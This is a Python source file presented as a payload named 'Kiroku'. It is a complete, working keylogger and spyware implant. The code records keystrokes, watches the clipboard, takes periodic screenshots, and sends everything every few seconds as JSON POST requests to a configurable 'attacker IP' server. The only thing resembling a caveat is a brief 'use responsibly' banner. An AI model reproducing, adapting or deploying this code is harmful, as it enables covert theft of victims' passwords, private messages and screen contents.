"""
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄  
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███ 
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███ 
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███ 
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███ 
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███ 
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███ 
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Payload)
  ▀                ███    ███              ▀                    
                                                   Kuraiyume
                                                   
Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
"""

from pynput import keyboard
import requests
import json
import threading
import pyperclip
from PIL import ImageGrab
import io
import base64
import time

# Global variables to store captured data
keystrokes = ""  # Buffer to store captured keystrokes
clipboard_data = ""  # Global variable to store clipboard content
previous_clipboard_data = ""  # To track the previous clipboard content

# Configuration settings
server_ip = "127.0.0.1"  # Change this based on your attacker IP
server_port = 8080  # Change this based on your specified port
send_interval = 5 # Interval (in seconds) between sending keystrokes and clipboard data (Change if needed)
screenshot_interval = 10 # Interval (in seconds) between sending screenshots (Change if needed)

# Track whether Ctrl, Alt, Shift is pressed
ctrl_pressed = False
alt_pressed = False
shift_pressed = False

def capture_screenshot():
    try:
        # Capture screenshot
        screenshot = ImageGrab.grab()
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        screenshot_base64 = base64.b64encode(buffered.getvalue()).decode()
        return screenshot_base64
    except Exception as e:
        print(f"Couldn't capture screenshot: {e}")
        return ""
    
def send_data():
    global keystrokes, clipboard_data
    last_screenshot_time = time.time()
    screenshot_base64 = ""
    while True:
        try:
            current_time = time.time()
            screenshot_base64 = ""  # Default empty value
            if current_time - last_screenshot_time >= screenshot_interval:
                screenshot_base64 = capture_screenshot()
                last_screenshot_time = current_time
            # Only include clipboard data if it has a value
            payload_data = {
                "keyboardData": keystrokes,
                "screenshot": screenshot_base64,
                "clipboardData": clipboard_data
            }
            # Create payload in JSON format
            payload = json.dumps(payload_data)
            # Send POST request to the server with the keystrokes, clipboard data, and screenshot
            r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
            
            # Clear the buffer after successful send
            keystrokes = ""
            clipboard_data = ""
        except Exception as e:
            print(f"Couldn't complete request: {e}")
        # Wait for the specified interval before sending again
        time.sleep(send_interval)

def handle_keystrokes(key):
    global keystrokes, ctrl_pressed, alt_pressed, shift_pressed
    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.backspace:
            if len(keystrokes) > 0:
                keystrokes = keystrokes[:-1]
        elif key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            alt_pressed = True
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
            shift_pressed = True
        elif key == keyboard.Key.cmd:
            return
        elif key == keyboard.Key.print_screen or (ctrl_pressed and shift_pressed and key == keyboard.Key.s):
            return
        else:
            if not (ctrl_pressed or alt_pressed):
                keystrokes += str(key).strip("'")
        
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    global ctrl_pressed, alt_pressed, shift_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_pressed = False
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
        shift_pressed = False

def monitor_clipboard():
    global clipboard_data, previous_clipboard_data
    while True:
        try:
            current_clipboard_data = pyperclip.paste()  # Capture current clipboard content
            if current_clipboard_data != previous_clipboard_data and current_clipboard_data.strip() != "":
                previous_clipboard_data = current_clipboard_data
                clipboard_data = current_clipboard_data
        except Exception as e:
            print(f"Failed to read clipboard data: {e}")
        time.sleep(1)  # Polling interval (Change if needed)

if __name__ == "__main__":
    # Start the data sending thread
    data_thread = threading.Thread(target=send_data, daemon=True)
    data_thread.start()
    # Start the clipboard monitoring thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    # Start the key listener
    with keyboard.Listener(on_press=handle_keystrokes, on_release=on_release) as listener:
        listener.join()
